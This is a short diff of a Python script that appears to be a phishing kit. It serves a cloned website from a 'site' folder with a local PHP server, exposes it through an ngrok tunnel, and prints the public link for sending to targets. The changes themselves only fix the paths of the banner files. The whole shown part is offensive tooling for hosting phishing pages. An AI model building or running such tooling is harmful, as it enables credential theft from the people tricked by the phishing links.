@@ -14,7 +14,7 @@ cyan  = "\033[96m"
 os.system("chmod +x Abir/ngrok*")
 os.system("killall ngrok> /dev/null 2>&1 || killall ngrok> /dev/null 2>&1")
 os.system("killall php> /dev/null 2>&1")
-os.system("lolcat /A-PHIS.py")
+os.system("lolcat A-PHIS.py")
 main_opt=str(input(red+"\n[★] Select Your Option : "+yellow))
 
 if main_opt=="01" or main_opt=="1":
@@ -63,7 +63,7 @@ os.system("cd site/"+website+"/ && php -S 127.0.0.1:8080> /dev/null 2>&1 &")
 os.system("./Abir/ngrok http 127.0.0.1:8080> /dev/null 2>&1 &")
 os.system("clear")
 def an():
-	os.system("lolcat /phislogo.py")
+	os.system("lolcat phislogo.py")
 	print()
 	print(""+green+"plz wait  few seconde and  on your hotspot else its well not work")
 	print()
@@ -233,7 +233,7 @@ $$$$$$\\$$$$$$  /
 """)
 time.sleep(1)
 os.system("clear")
-os.system("lolcat /phislogo.py")
+os.system("lolcat phislogo.py")
 print()
 os.system("curl  http://localhost:4040/api/tunnels > tunnels.json")
 with open('tunnels.json') as data_file:    
@@ -242,7 +242,7 @@ msg = (""+green+"Your link is:"+blue+" ")
 for i in datajson['tunnels']:
     msg = msg + i['public_url']+ '\n'+''+green+'Your link is : '+cyan+''
 os.system('clear')
-os.system("lolcat /phislogo.py")
+os.system("lolcat phislogo.py")
 print()
 print("       if you face any error plz restart this tool again")
 print()
